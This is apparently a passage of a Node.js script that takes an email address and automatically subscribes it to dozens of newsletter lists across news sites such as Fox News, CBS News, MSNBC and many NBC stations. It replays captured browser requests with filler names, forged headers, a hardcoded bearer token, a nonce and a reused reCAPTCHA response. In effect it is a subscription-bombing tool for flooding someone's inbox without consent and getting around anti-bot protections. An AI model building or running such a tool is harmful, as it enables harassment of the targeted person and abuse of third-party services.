const fetch = require('node-fetch');
const readline = require('readline');
const consola = require('consola');
const colors = require('colors');
colors;

const sites = {
    "crosswalk.com": (email => {
        fetch("https://allpass.salemwebnetwork.com/newsletters/fullsubmission?&emailAddress=" +
            email.replace('@', '%40') + "&firstName=&lastName=&newsletters=4355%2C9944%2C8033%2C4273%2C10779%2C8172%2C10275%2C10117%2C8398%2C4269%2C7132%2C4263%2C6913%2C5132%2C8247%2C5043%2C4299%2C5063%2C8244%2C4374%2C11055%2C4664%2C5163%2C5047%2C5051%2C5166%2C5165%2C5167%2C4576%2C4297%2C4320%2C4285%2C4865%2C6972%2C4653%2C8787%2C5055%2C4283%2C4317%2C5168%2C4377%2C8183%2C4929%2C4759%2C4798%2C9365%2C4787%2C7512%2C4311%2C4395%2C4396%2C4549%2C4702%2C4590%2C5039%2C4708%2C5035%2C4808%2C4272%2C4289%2C8455%2C9014%2C8978%2C8630%2C8579%2C4288%2C4917%2C5160%2C4630%2C10356%2C4281%2C8132%2C10687%2C9913%2C10643%2C7065%2C7326%2C8063%2C8034%2C5027%2C7473%2C8070%2C4582%2C6762%2C9959%2C4392%2C5031%2C7469%2C4750%2C4779%2C8309%2C4601%2C5012%2C4541%2C6782%2C4906%2C4724%2C4537%2C4682%2C4545%2C10230%2C4900%2C4719%2C4712%2C4742%2C8235%2C4405%2C8249%2C5974%2C4642%2C4622%2C4516%2C8212%2C4376%2C4771%2C4398%2C4402%2C4399%2C5117%2C4394%2C4279%2C4913%2C4397%2C5128%2C8446%2C4303%2C8255%2C4605%2C8059%2C4290%2C4404%2C8239%2C4275%2C4557%2C4362%2C4564%2C8123%2C8075%2C4287%2C4885%2C8179%2C4597%2C4738%2C8175%2C8165%2C4291%2C8464&signupLocation=Newsletter%20Page&signupDomain=www.crosswalk.com&signupUrl=%2Fnewsletters%2F&signupPage=2&screen=1360&callback=jQuery111006821587697244988_1616090897561&_=1616090897562", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "script",
                "sec-fetch-mode": "no-cors",
                "sec-fetch-site": "cross-site"
            },
            "referrer": "https://www.crosswalk.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": null,
            "method": "GET",
            "mode": "cors"
        })
            .then(() => {
                consola.success('Signed up for https://www.crosswalk.com/newsletters/');
            }).catch(err => {
            consola.info('An error occurred while signing up for https://www.crosswalk.com/newsletters/');
            consola.error(err);
        });
    }),
    "outsideonline.com": (email => {
        fetch("https://api.sail-track.com/v1/track/user/signup", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "Bearer b112a61d8ef97343cade80b6f0a47e18",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-lib-version": "v1.0.1"
            },
            "referrer": "https://www.outsideonline.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"vars\":{\"signup_date\":\"2021-03-18\",\"move_every_day\":true,\"dispatch\":true,\"what_you_missed\":true,\"bodywork\":true,\"destinations\":true,\"gear_fix\":true,\"watchlist\":true,\"indefinitely_wild\":true,\"deal_fix\":true,\"sponsor\":true,\"source\":\"newsletter-signup_basic-page\"},\"lists\":{\"Master List\":1},\"email\":\"" + email + "\",\"content\":\"cccc1f37572e39b341525e75e4f4f503\"}",
            "method": "POST",
            "mode": "cors"
        }).then(res => {
            return res.json();
        }).then(body => {
            if (body.sailthruHid) {
                return consola.success('Signed up for https://www.outsideonline.com/2063191/outside-magazine-newsletter-signup');
            }
            consola.info('Couldn\'t sign up for https://www.outsideonline.com/2063191/outside-magazine-newsletter-signup');
        }).catch(() => {
            consola.info('Couldn\'t sign up for https://www.outsideonline.com/2063191/outside-magazine-newsletter-signup');
        });
    }),
    "link.wgal.com": (async email => {
        await fetch("https://link.wgal.com/manage/5e3/optout?email=" + email, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "https://link.wgal.com/manage/5e3/optout?email=" + email,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "lists%5Bwgal_news_closings%5D=on&lists%5Bwgal_news_afternoon_headlines%5D=on&lists%5Bwgal_matter_of_fact%5D=on&lists%5Bwgal_news_weather_forecast%5D=on&lists%5Bwgal-coronavirus%5D=on&lists%5Bwgal_news_politics%5D=on&lists%5Bwgal_news_local_breaking%5D=on&lists%5Bwgal_news_national_breaking%5D=on&lists%5Bwgal_news_morning_headlines%5D=on&lists%5Bwgal_consumer_news%5D=on&lists%5Bwgal_news_entertainment%5D=on&lists%5Bwgal_weather_alerts_PAC001%5D=on&lists%5Bwgal_weather_alerts_MDC510%5D=on&lists%5Bwgal_weather_alerts_MDC005%5D=on&lists%5Bwgal_weather_alerts_PAC011%5D=on&lists%5Bwgal_weather_alerts_MDC013%5D=on&lists%5Bwgal_weather_alerts_PAC029%5D=on&lists%5Bwgal_weather_alerts_PAC041%5D=on&lists%5Bwgal_weather_alerts_PAC043%5D=on&lists%5Bwgal_weather_alerts_PAC055%5D=on&lists%5Bwgal_weather_alerts_MDC021%5D=on&lists%5Bwgal_weather_alerts_PAC067%5D=on&lists%5Bwgal_weather_alerts_PAC071%5D=on&lists%5Bwgal_weather_alerts_PAC075%5D=on&lists%5Bwgal_weather_alerts_PAC087%5D=on&lists%5Bwgal_weather_alerts_PAC099%5D=on&lists%5Bwgal_weather_alerts_PAC107%5D=on&lists%5Bwgal_weather_alerts_PAC133%5D=on&profile_id=60539c4e0cc4dc404c68680b&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://link.wgal.com/join/5e3/signin');
    }),
    "link.wcvb.com": (async email => {
        await fetch("http://link.wcvb.com/manage/5e0/optout?email=" + email, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "http://link.wcvb.com/manage/5e0/optout?email=" + email,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "lists%5Bwcvb_news_entertainment%5D=on&lists%5Bwcvb_news_local_breaking%5D=on&lists%5Bwcvb_news_weather_forecast%5D=on&lists%5Bwcvb-coronavirus%5D=on&lists%5Bwcvb_consumer_news%5D=on&lists%5Bwcvb_news_morning_headlines%5D=on&lists%5Bwcvb_news_politics%5D=on&lists%5Bwcvb_news_afternoon_headlines%5D=on&lists%5Bwcvb_matter_of_fact%5D=on&lists%5Bwcvb_chronicle%5D=on&lists%5Bwcvb_news_national_breaking%5D=on&lists%5Bwcvb_weather_alerts_MAC001%5D=on&lists%5Bwcvb_weather_alerts_NHC001%5D=on&lists%5Bwcvb_weather_alerts_MAC005%5D=on&lists%5Bwcvb_weather_alerts_NHC005%5D=on&lists%5Bwcvb_weather_alerts_MAC007%5D=on&lists%5Bwcvb_weather_alerts_MAC009%5D=on&lists%5Bwcvb_weather_alerts_NHC011%5D=on&lists%5Bwcvb_weather_alerts_NHC013%5D=on&lists%5Bwcvb_weather_alerts_MAC017%5D=on&lists%5Bwcvb_weather_alerts_MAC019%5D=on&lists%5Bwcvb_weather_alerts_MAC021%5D=on&lists%5Bwcvb_weather_alerts_MAC023%5D=on&lists%5Bwcvb_weather_alerts_NHC015%5D=on&lists%5Bwcvb_weather_alerts_NHC017%5D=on&lists%5Bwcvb_weather_alerts_MAC025%5D=on&lists%5Bwcvb_weather_alerts_VTC025%5D=on&lists%5Bwcvb_weather_alerts_MAC027%5D=on&profile_id=60539d4f2547d0534273649f&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://link.wcvb.com/join/5e3/signin');
    }),
    "nbcmiami.com/newsletters/": (async email => {
        await fetch("https://www.nbcmiami.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcmiami.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WTVJ_coronavirus\":1,\"WTVJ_BreakingNews\":1,\"WTVJ_News7am\":1,\"WTVJ_NewsNoon\":1,\"WTVJ_News8pm\":1,\"WTVJ_Weather\":1,\"WTVJ_Sports\":1,\"WTVJ_Entertainment\":1,\"WTVJ_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbcmiami.com/newsletters/');
    }),
    "foxnews.com/newsletters": (async email => {
        const subscribe = async slid => {
            return await fetch("https://www.foxnews.com/portal/newsalertsubscribe", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "x-requested-with": "XMLHttpRequest"
                },
                "referrer": "https://www.foxnews.com/newsletters",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": "email=" + email.replace('@', '%40') + "&slids=" + slid,
                "method": "POST",
                "mode": "cors"
            })//.then(res => res.json()).then(console.log);
        }

        await subscribe('3DC725E303A24F8D7457D18811A93C18');
        await subscribe('3DC725E303A24F8D106D04335B030A1E');
        await subscribe('3DC725E303A24F8DBA8D7ED90EFD2033');
        await subscribe('3DC725E303A24F8DE8DB8BD2CA76E43D');
        await subscribe('3DC725E303A24F8DB2CE37CF687DE56B');
        await subscribe('3DC725E303A24F8D2F397E652DAD2AE6');
        await subscribe('3DC725E303A24F8D8BF986F69AEAACEA');
        await subscribe('3DC725E303A24F8D0E2C21B39073C09B');
        await subscribe('3DC725E303A24F8D10BFA69067B1CAC9');

        await fetch("https://www.foxnews.com/portal/newsalertsubscribe?type=foxnation", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.foxnews.com/newsletters",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"campaign\":\"fox-nation\",\"url\":\"https://www.foxnews.com/newsletters\"}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://foxnews.com/newsletters');
    }),
    "cbsnews.com/newsletters": (async email => {
        await fetch("https://www.cbsnews.com/newsletters/xhr/signup", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "text/plain",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.cbsnews.com/newsletters/widget?v=4303070594ae09e4278f40f24f771b58&subs=e889%2Ce881%2Ce882%2Ce879%2Ce883%2Ce884%2Ce241",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"sub\":\"e889,e881,e882,e879,e883,e884,e241\"}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://cbsnews.com/newsletters');
    }),
    "nbcboston.com/newsletters/": (async email => {
        // FIXED AND UPDATED
        await fetch("https://www.nbcboston.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcboston.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WBTS_coronavirus\":1,\"WBTS_BreakingNews\":1,\"WBTS_News7am\":1,\"WBTS_NewsNoon\":1,\"WBTS_News5pm\":1,\"WBTS_News11pm\":1,\"WBTS_Weather\":1,\"WBTS_Entertainment\":1,\"WBTS_Investigations\":1,\"WBTS_Contests\":1}}",
            "method": "POST",
            "mode": "cors",
            "credentials": "omit"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcboston.com/newsletters/');
    }),
    "nbcnewyork.com/newsletters/": (async email => {
        // PROB WORKING
        await fetch("https://www.nbcnewyork.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcnewyork.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WNBC_News7am\":1,\"WNBC_News11pm\":1,\"WNBC_Contests\":1,\"WNBC_BreakingNews\":1,\"WNBC_Weather\":1,\"WNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcnewyork.com/newsletters/');
    }),
    "nbcchicago.com/newsletters/": (async email => {
        // PROB WORKING
        await fetch("https://www.nbcchicago.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcchicago.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WMAQ_coronavirus\":1,\"WMAQ_News7am\":1,\"WMAQ_Noon\":1,\"WMAQ_News8pm\":1,\"WMAQ_BreakingNews\":1,\"WMAQ_Weather\":1,\"WMAQ_Sports\":1,\"WMAQ_Entertainment\":1,\"WMAQ_Contests\":1,\"WMAQ_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcchicago.com/newsletters/');
    }),
    "nbcbayarea.com/newsletters/": (async email => {
        // PROB WORKING
        await fetch("https://www.nbcbayarea.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcbayarea.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"kntv_coronavirus\":1,\"KNBC_News7am\":1,\"KNBC_NewsNoon\":1,\"KNBC_News5pm\":1,\"KNBC_BreakingNews\":1,\"KNBC_Weather\":1,\"KNBC_Sports\":1,\"KNBC_Entertainment\":1,\"KNBC_Contests\":1,\"KNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcbayarea.com/newsletters/');
    }),
    "nbclosangeles.com/newsletters/": (async email => {
        await fetch("https://www.nbclosangeles.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbclosangeles.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KNBC_News7am\":1,\"KNBC_NewsNoon\":1,\"KNBC_News5pm\":1,\"KNBC_BreakingNews\":1,\"KNBC_Weather\":1,\"KNBC_Sports\":1,\"KNBC_Entertainment\":1,\"KNBC_Contests\":1,\"KNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbclosangeles.com/newsletters/');
    }),
    "nbcsandiego.com/newsletters/": (async email => {
        await fetch("https://www.nbcsandiego.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcsandiego.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KNSD_coronavirus\":1,\"KNSD_News7am\":1,\"KNSD_NewsNoon\":1,\"KNSD_News6pm\":1,\"KNSD_BreakingNews\":1,\"KNSD_Weather\":1,\"KNSD_Sports\":1,\"KNSD_TheScene\":1,\"KNSD_Contests\":1,\"KNSD_SoundDiego\":1,\"KNSD_SoundDiegoPlatinum\":1,\"KNSD_WorthTheTrip\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcsandiego.com/newsletters/');
    }),
    "nbcconnecticut.com/newsletters/": (async email => {
        await fetch("https://www.nbcconnecticut.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcconnecticut.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WVIT_coronavirus\":1,\"WVIT_News7am\":1,\"WVIT_NewsNoon\":1,\"WVIT_News8p\":1,\"WVIT_BreakingNews\":1,\"WVIT_Weather\":1,\"WVIT_Contest\":1,\"WVIT_Entertainment\":1,\"WVIT_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcconnecticut.com/newsletters/');
    }),
    "nbcwashington.com/newsletters/": (async email => {
        await fetch("https://www.nbcwashington.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcwashington.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WRC_coronavirus\":1,\"WRC_News7am\":1,\"WRC_NewsNoon\":1,\"WRC_News8pm\":1,\"WRC_Olympics\":1,\"WRC_BreakingNews\":1,\"WRC_Contests\":1,\"WRC_Sports\":1,\"WRC_Entertainment\":1,\"WRC_Weather\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        consola.success('Signed up for https://www.nbcwashington.com/newsletters/');
    }),
    "nbcdfw.com/newsletters/": (async email => {
        await fetch("https://www.nbcdfw.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d",
            },
            "referrer": "https://www.nbcdfw.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KXAS_coronavirus\":1,\"KXAS_News7am\":1,\"KXAS_NewsNoon\":1,\"KXAS_News8pm\":1,\"KXAS_BreakingNews\":1,\"KXAS_Weather\":1,\"KXAS_Entertainment\":1,\"KXAS_Announcements\":1,\"KXAS_Investigations\":1,\"KXAS_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        return consola.success('Signed up for https://www.nbcdfw.com/newsletters/');
    }),
    "nbcphiladelphia.com/newsletters/": (async email => {
        await fetch("https://www.nbcphiladelphia.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcphiladelphia.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WCAU_wawa\":1,\"WCAU_News7am\":1,\"WCAU_NewsNoon\":1,\"WCAU_News8pm\":1,\"WCAU_BreakingNews\":1,\"WCAU_Weather\":1,\"WCAU_Sports\":1,\"WCAU_Entertainment\":1,\"WCAU_Olympics\":1,\"WCAU_Contests\":1,\"WCAU_Announcements\":1}}",
            "method": "POST",
            "mode": "cors"
        })//.then(res => res.json()).then(console.log);
        return consola.success('Signed up for https://www.nbcphiladelphia.com/newsletters/');
    }),
    "http://link.msnbc.com/join/5ck/msnbc-updates-signup": (async email => {
        await fetch("http://link.msnbc.com/join/5ck/msnbc-updates-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "upgrade-insecure-requests": "1",
            },
            "referrer": "http://link.msnbc.com/join/5ck/msnbc-updates-signup&hash=37d894cccdf4b3f89cc88dac8272a18b",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + email.replace('@', '%40') + "&lists%5BMaster%5D=1&vars%5Bsub_msnbcupdates%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq27AKlSQqnwkXjRcumtv2Az3CHHOv9cGNC2tpq2AahGSs1EYPvWzNk5KKcKiQsIdE1CMBsUD3pu_qsrdrJfhFKxJRiVR3TJk2t1wyRoA2n2FjsoCQ3FO4W7n7-NK6WQYY7JMmSumV2dqNDuWOKJpNE1F9bm2xYuI9thwoCzGj8fQIh7PTnaho4bu9bXqkHtDezAHk9OwUbyE77mw_tib6caAS-iz52AEVmgYDV-qJc35izvv7I9Q_fUlh8Y5G27p58_kbyfZe_mjaoQ62-1zl_ne4XQDK7dXB4Io_gr1dVr9sYHbOmK_78ZKUP66GVSTwuGff0bhZIJbLNYuD4BaRe3HetqCHvBPiwo7GQb8HJ4GukOtdkYNVcrF6nmJ_Pa1G5XBGpaWtUi_gqEeoy_Z-63vv5Rtfd5iG_jf4o9A7RFnD7WYiaeot1RhZT9wIDGIw2Cu21T4&nonce_6053a65a2c778=6053a65a2c779&profile_id=591edf3bade9c297078b4594&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for http://link.msnbc.com/join/5ck/msnbc-updates-signup');
    }),
    "contacts.nbc.ca": (async email => {
        await fetch("https://www.contacts.nbc.ca/newsletter/subscription?vs=OTZkNmNiNTktOTg2NS00ZWI4LWIzOTQtZjkwNTM1YTA1YzdlOzsS1", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "https://www.contacts.nbc.ca/newsletter/subscription",
            "referrerPolicy": "strict-origin-when-cross-origin",
